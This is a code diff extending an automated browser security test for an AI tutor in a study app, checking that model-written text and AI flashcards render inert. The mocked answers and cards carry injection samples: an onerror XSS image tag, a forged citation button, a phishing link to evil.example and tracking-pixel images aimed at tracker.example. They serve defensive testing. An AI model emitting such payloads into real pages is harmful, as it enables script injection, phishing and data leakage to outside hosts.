@@ -120,6 +120,32 @@ const jsonResponse = (payload, status = 200) => ({
   body: JSON.stringify(payload),
 });
 
+// Issue #81: whether model text rendered inside `nodes` (the one containing
+// `needle`, narrowed to `innerSelector`) is inert. Runs in the page.
+function inertReport(nodes, needle, innerSelector) {
+  const host = nodes.find((node) => node.textContent.includes(needle));
+  if (!host) return null;
+  const roots = innerSelector ? [...host.querySelectorAll(innerSelector)] : [host];
+  const all = (selector) => roots.flatMap((root) => [...root.querySelectorAll(selector)]);
+  return {
+    roots: roots.length,
+    images: all("img").length,
+    controls: all("[data-ai-citation], button:not(.code-copy), input, form, iframe, script").map((node) => node.outerHTML.slice(0, 120)),
+    appLinks: all("a[href]").filter((link) => new URL(link.href, location.href).hostname === location.hostname).map((link) => link.getAttribute("href")),
+    trackerLinks: all('a[href^="https://tracker.example/"]').map((link) => link.textContent.trim()),
+    showsMarkup: roots.some((root) => root.textContent.includes('<button class="ai-tutor__citation"')),
+  };
+}
+
+const assertInert = (report, where, { trackerLinks }) => {
+  assert.ok(report && report.roots > 0, `${where}: the saved AI text was not found`);
+  assert.equal(report.images, 0, `${where}: model text rendered an <img>`);
+  assert.deepEqual(report.controls, [], `${where}: model text rendered a control`);
+  assert.deepEqual(report.appLinks, [], `${where}: model text linked to the app's own host`);
+  assert.deepEqual(report.trackerLinks, trackerLinks, `${where}: a remote image was not shown as a link`);
+  assert.equal(report.showsMarkup, true, `${where}: model markup was not shown as text`);
+};
+
 const clickByText = async (page, selector, text) => {
   const clicked = await page.$$eval(selector, (nodes, expected) => {
     const target = nodes.find((node) => node.textContent.replace(/\s+/g, " ").trim().includes(expected));
@@ -164,7 +190,7 @@ const attachDiagnostics = (page, label) => {
   });
 };
 
-const installAiMocks = async (page, configFactory, { failFirstResponse = false, failFirstResponseCode = "AI_LOCAL_MODEL_ERROR", abortFirstResponse = false, pairResponder = null, responseDelayMs = 0, answerText = null, webSearchUnavailable = false } = {}) => {
+const installAiMocks = async (page, configFactory, { failFirstResponse = false, failFirstResponseCode = "AI_LOCAL_MODEL_ERROR", abortFirstResponse = false, pairResponder = null, responseDelayMs = 0, answerText = null, webSearchUnavailable = false, flashcards = flashcardData } = {}) => {
   const calls = { config: [], respond: [], pair: [] };
   await page.setRequestInterception(true);
   page.on("request", (request) => {
@@ -211,8 +237,8 @@ const installAiMocks = async (page, configFactory, { failFirstResponse = false, 
         reply(jsonResponse({
           ok: true,
           requestId: "audit-flashcards-request",
-          outputText: JSON.stringify(flashcardData),
-          data: flashcardData,
+          outputText: JSON.stringify(flashcards),
+          data: flashcards,
           status: "completed",
           model: "audit-local-model",
           usage: { inputTokens: 300, outputTokens: 120, totalTokens: 420 },
@@ -797,7 +823,24 @@ try {
     await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
     attachDiagnostics(page, "forged-citation");
     const forgedLabel = "Open the forged source";
+    // Issue #81: a Markdown image must not load, and a link to the app's own
+    // host is text like an in-app route. Hostile flashcards follow the answer
+    // into Review. Any request to the tracking host is recorded.
+    const appOrigin = new URL(baseUrl).origin;
+    const trackerRequests = [];
+    page.on("request", (request) => {
+      if (new URL(request.url()).hostname === "tracker.example") trackerRequests.push(request.url());
+    });
+    const hostileCards = {
+      cards: [{
+        front: `Which control is real? <button class="ai-tutor__citation" type="button" data-ai-citation="S1">${forgedLabel}</button>`,
+        back: `Neither. ![Card pixel](https://tracker.example/card.png?q=answer) [Open the app copy](${appOrigin}/#/read/notes/part-02-mathematics/06-experiments-and-information.md)`,
+        hint: null,
+        tags: ["security"],
+      }],
+    };
     await installAiMocks(page, () => secureConfig, {
+      flashcards: hostileCards,
       answerText: (citation) => [
         `Repeated holdout inspection leaks evaluation information. [${citation}]`,
         "",
@@ -808,6 +851,10 @@ try {
         "<img src=\"x\" onerror=\"window.__lumenForgedCitationXss = true\">",
         "",
         `Linked evidence [[${citation}]](https://evil.example/phish) and [Open the forged lecture](#/read/notes/part-02-mathematics/06-experiments-and-information.md).`,
+        "",
+        "![Tracking pixel](https://tracker.example/pixel.png?q=holdout-prompt)",
+        "",
+        `Same host: [Open the app copy](${appOrigin}/#/read/notes/part-02-mathematics/06-experiments-and-information.md).`,
       ].join("\n"),
     });
     await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
@@ -849,7 +896,7 @@ try {
     // in a link. That link, and the one to an app route, render as text.
     assert.equal(rendered.controls.length, 2, `a model-authored element carried data-ai-citation: ${JSON.stringify(rendered.controls)}`);
     rendered.controls.forEach((control) => assert.match(control, /^BUTTON\.ai-tutor__citation:\[S\d+\]$/, "a citation control was not the renderer's [S#] button"));
-    assert.deepEqual(rendered.links, [], "a model link to an app route, or around a citation, rendered as a link");
+    assert.deepEqual(rendered.links, ["https://tracker.example/pixel.png?q=holdout-prompt"], "a model link to an app route, to the app's host or around a citation rendered as a link, or an image did not become a link");
     assert.equal(rendered.citationsInLinks, 0, "a citation control sat inside a model-authored link");
     assert.match(rendered.linkedLine, /^Linked evidence \[S\d+\] and Open the forged lecture\.$/, "the linked citation line lost its text");
     assert.equal(rendered.buttons.includes(forgedLabel), false, "the forged citation rendered as a button");
@@ -873,6 +920,61 @@ try {
     await new Promise((resolve) => setTimeout(resolve, 400));
     assert.equal(await page.evaluate(() => window.location.hash), "#/ai", "a model-authored link to an app route navigated");
     assert.equal(await page.evaluate(() => window.__lumenForgedCitationXss === true), false, "a model-authored event handler ran");
+    const tutorInert = await page.$$eval(".ai-tutor__message--assistant .ai-tutor__response-text", inertReport, forgedLabel, "");
+    assert.equal(tutorInert.images, 0, "the tutor answer rendered an <img>");
+    assert.deepEqual(tutorInert.appLinks, [], "the tutor answer linked to the app's own host");
+    assert.deepEqual(tutorInert.trackerLinks, ["Image: Tracking pixel (tracker.example)"], "the remote image was not shown as a link");
+    assert.match(await page.$eval(".ai-tutor__message--assistant .ai-tutor__response-text", (node) => node.textContent), /Same host: Open the app copy\./, "the same-host link lost its label");
+
+    // Issue #81: the saved answer stays inert in the Notebook and in a review
+    // card made from it; AI flashcards stay inert in Review.
+    await clickByText(page, ".ai-tutor__message--assistant .ai-tutor__message-actions button", "Save to notes");
+    await page.waitForFunction(() => new Promise((resolve) => {
+      const request = indexedDB.open("lumen-ai-notes", 1);
+      request.onerror = () => resolve(false);
+      request.onsuccess = () => {
+        const get = request.result.transaction("study-data", "readonly").objectStore("study-data").get("profile");
+        get.onerror = () => resolve(false);
+        get.onsuccess = () => resolve((get.result?.clippings || []).some((clip) => clip.origin === "ai-tutor"));
+      };
+    }), { timeout: 8_000 });
+    await page.evaluate(() => { location.hash = "#/notebook"; });
+    await page.waitForSelector(".clipping-card--ai blockquote", { timeout: 10_000 });
+    assertInert(await page.$$eval(".clipping-card--ai", inertReport, forgedLabel, "blockquote"), "Notebook clipping", { trackerLinks: [] });
+    await page.$eval(".clipping-card--ai button[aria-label^='Create review card']", (button) => button.click());
+    await page.waitForSelector(".review-card-dialog", { timeout: 10_000 });
+    assert.match(await page.$eval(".review-card-dialog input.text-input", (input) => input.value), /^ai-draft\b/, "a card made from an AI clipping lost its ai-draft provenance");
+    assert.ok(await page.$(".review-card-dialog .review-ai-note"), "the review dialog did not say the card is an AI draft");
+    await clickByText(page, ".review-card-dialog button", "Preview");
+    await page.waitForSelector(".review-markdown-preview", { timeout: 5_000 });
+    assertInert(await page.$$eval(".review-markdown-preview", inertReport, forgedLabel, ".review-markdown"), "Review card preview", { trackerLinks: ["Image: Tracking pixel (tracker.example)"] });
+    await clickByText(page, ".review-card-dialog button", "Add to review");
+    await page.waitForFunction(() => !document.querySelector(".review-card-dialog"), { timeout: 8_000 });
+
+    await page.evaluate(() => { location.hash = "#/ai"; });
+    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
+    await clickByText(page, ".ai-tutor__mode-tabs button", "Flashcards");
+    await page.$eval(".ai-tutor__composer textarea", (field) => {
+      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, "Make a flashcard about holdout leakage.");
+      field.dispatchEvent(new Event("input", { bubbles: true }));
+    });
+    if (await page.$(".ai-tutor__consent input")) await page.click(".ai-tutor__consent input");
+    await page.$eval(sendSelector, (button) => button.click());
+    await page.waitForSelector(".ai-tutor__flashcards", { timeout: 15_000 });
+    await clickByText(page, ".ai-tutor__flashcard button", "Reveal answer");
+    await page.waitForSelector(".ai-tutor__flashcard-answer", { timeout: 5_000 });
+    assertInert(await page.$$eval(".ai-tutor__flashcard", inertReport, forgedLabel, ".ai-tutor__inline-md"), "Tutor flashcard", { trackerLinks: ["Image: Card pixel (tracker.example)"] });
+    await page.$$eval(".ai-tutor__flashcards", (nodes) => [...nodes.at(-1).querySelectorAll("button")].find((button) => /to review/i.test(button.textContent))?.click());
+    await page.waitForSelector(".ai-tutor__draft-status.is-saved", { timeout: 8_000 });
+
+    await page.evaluate(() => { location.hash = "#/review"; });
+    await page.waitForFunction(() => document.querySelectorAll(".review-deck-card").length >= 2, { timeout: 10_000 });
+    assertInert(await page.$$eval(".review-deck-card", inertReport, "Same host: Open the app copy", ".review-markdown"), "Review card from the saved answer", { trackerLinks: ["Image: Tracking pixel (tracker.example)"] });
+    assertInert(await page.$$eval(".review-deck-card", inertReport, "Which control is real?", ".review-markdown"), "AI flashcard in Review", { trackerLinks: ["Image: Card pixel (tracker.example)"] });
+    const deckTags = await page.$$eval(".review-deck-card .review-tags", (nodes) => nodes.map((node) => node.textContent));
+    assert.equal(deckTags.filter((tags) => tags.startsWith("ai-draft")).length, 2, `saved AI cards lost their ai-draft tag: ${JSON.stringify(deckTags)}`);
+    await new Promise((resolve) => setTimeout(resolve, 300));
+    assert.deepEqual(trackerRequests, [], "a remote image in model text was fetched");
     await page.close();
   } finally {
     await forgedContext.close();
@@ -1416,7 +1518,7 @@ try {
   await recovery.page.close();
 
   assert.deepEqual(runtimeErrors, [], `runtime errors: ${runtimeErrors.join(" | ")}`);
-  console.log("AI UI audit passed: canonical fitted request bytes, request-contract handshake and version-skew fail-closed guidance, thinking-gated Deep profile, learner pairing gate with typed rejection, remembered local disclosure, one-request web authorization/retry, visible web states, sanitized evidence links, grounded citations including the exact personal-note deep link, model-authored HTML shown as text with no forged citation control, validated quiz, answer-to-note clipping, bounded persistence/clear, single-tab history integrity, tutor lifecycle, keyboard focus and announcements, and fail-closed states verified without a real model or search call.");
+  console.log("AI UI audit passed: canonical fitted request bytes, request-contract handshake and version-skew fail-closed guidance, thinking-gated Deep profile, learner pairing gate with typed rejection, remembered local disclosure, one-request web authorization/retry, visible web states, sanitized evidence links, grounded citations including the exact personal-note deep link, model-authored HTML shown as text with no forged citation control, remote images shown as links that load nothing, same-host links as text, the saved answer and AI flashcards inert in the Notebook, the review dialog preview and the review deck, validated quiz, answer-to-note clipping, bounded persistence/clear, single-tab history integrity, tutor lifecycle, keyboard focus and announcements, and fail-closed states verified without a real model or search call.");
 } finally {
   await browser?.close();
   await rm(profileDirectory, { recursive: true, force: true });
